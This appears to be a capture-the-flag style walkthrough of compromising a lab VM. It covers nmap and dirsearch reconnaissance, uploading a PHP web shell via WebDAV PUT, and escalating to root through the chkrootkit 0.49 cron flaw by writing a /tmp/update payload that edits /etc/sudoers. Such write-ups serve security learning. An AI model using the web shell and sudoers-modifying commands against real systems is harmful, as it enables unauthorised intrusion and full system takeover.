## getting the ip 

## ip a

<img width="1058" height="358" alt="Screenshot 2026-03-04 at 21 47 33" src="https://github.com/user-attachments/assets/8b298288-e2ae-4b33-b4d6-5ccbddd97d39" />

## getting the target ip : nmap -sn 10.126.40.107/24

<img width="712" height="254" alt="Screenshot 2026-03-04 at 21 49 24" src="https://github.com/user-attachments/assets/63735c28-b02e-4e10-a93d-a98666469639" />

**target ip:10.126.40.176** 

**ports active on the target**

## nmap -sV 10.126.40.176

<img width="919" height="262" alt="Screenshot 2026-03-04 at 21 51 33" src="https://github.com/user-attachments/assets/00ffa97f-1e93-4cb8-9c9f-1fb03dc91fde" />

the ports and services that are active 

### port - 22 -- ssh 
### port - 80 -- http (lighttpd server)

opening the http port in browser 

<img width="2102" height="1764" alt="image" src="https://github.com/user-attachments/assets/64b1a987-bc88-4698-97f0-54aff06e907d" />

brute forcing for knowing the endpoints present for the site :

### dirsearch -u http://10.126.40.176/

<img width="661" height="227" alt="Screenshot 2026-03-05 at 11 12 48" src="https://github.com/user-attachments/assets/2894e0cb-e9c5-445d-97d7-2568fc1a1b58" />

got an endpoint **/test/** .

<img width="609" height="199" alt="Screenshot 2026-03-05 at 11 14 23" src="https://github.com/user-attachments/assets/a7f8c44c-65d5-4eac-a862-74cbe6802832" />

the parent directory is the file that is the home screen.

search for the HTTP METHODS on both the **home*** and the **test** 

**HOME**

<img width="1634" height="510" alt="image" src="https://github.com/user-attachments/assets/0bd7c0de-76d5-4b3a-b750-72482845ee38" />

**Test**

<img width="1141" height="291" alt="Screenshot 2026-03-05 at 11 19 06" src="https://github.com/user-attachments/assets/e3d8496f-350d-49ae-a298-73c30898c6e6" />

## /test/  -- PROPFIND | DELETE | MKCOL | PUT | MOVE | COPY | LOCK | UNLOCK | PROPATCH

using **PUT** -- we can get **RAC** -- Remote Code Execution -- we can inject a malicious code into the remote system and execute that to manipulate that working model.

## PUT 

we can inject a file that will let us to gain access to the shell as the "www-data" user directly to the system's terminal.

shell.php -- <?php system($_GET["cmd"]); ?> -- this will create a parameter value that helps us to communicate with the other shell.

<img width="549" height="148" alt="Screenshot 2026-03-07 at 11 23 42" src="https://github.com/user-attachments/assets/23cfb55e-8b9c-4c2b-b08f-05e5623a3f92" />

<img width="172" height="42" alt="Screenshot 2026-03-07 at 11 26 55" src="https://github.com/user-attachments/assets/d75f89a7-3ce2-4b14-8805-901a4a9d650a" />

<img width="912" height="227" alt="Screenshot 2026-03-07 at 11 27 46" src="https://github.com/user-attachments/assets/49c6431f-f08d-4448-b9c4-0ef4002f6aab" />

the shell is running 

<img width="599" height="110" alt="Screenshot 2026-03-07 at 11 31 27" src="https://github.com/user-attachments/assets/80b809a7-b11c-41d2-bc26-950cdcb8a784" />

in **/etc/cron.daily** directory there is a function chkrootkit(0.49) which have a vulnerability [https://www.exploit-db.com/exploits/33899] which will run the files in the **/tmp** which we can use and make the www-data user as a sudo user by updating the sudoers file in the etc directory.

### url - http://10.34.218.176/test/shell.php?cmd=echo%20'chmod%20777%20%2Fetc%2Fsudoers%20%26%26%20echo%20%22www-data%20ALL%3DNOPASSWD%3A%20ALL%22%20%3E%3E%20%2Fetc%2Fsudoers%20%26%26%20chmod%20440%20%2Fetc%2Fsudoers'%20%3E%20%2Ftmp%2Fupdate

### command - echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD: ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update -- the chkrootkit runs the files in the tmp directory as the root user so the sudoers can be changed via chkrootkit.

<img width="1045" height="82" alt="Screenshot 2026-03-07 at 11 59 03" src="https://github.com/user-attachments/assets/8d50d393-d440-484b-a951-a74b325e2f0b" />


the file has been created and actually the cron.daily will run once daily we need to wait a day for the cron-tab to run that file.

we need to change the permissions of the **update** file also so the chkrootkit will also have the permission to run it.

## chmod 777 update

now the chkrootkit runs the file "update" and give the www-data sudo access.

### sudo ls /root

### sudo cat /root/7d03aaa2bf93d80040f3f22ec6ad9d5a.txt

<img width="1382" height="180" alt="Screenshot 2026-03-07 at 12 27 06" src="https://github.com/user-attachments/assets/7628c919-3c1b-40ef-a3b2-4570ad7aeaf8" />


**but idk why i did not wait for a complete day actually i got the root access as soon as i changed the permissions of the file but as per the definations the cron.daily should run daily once.**


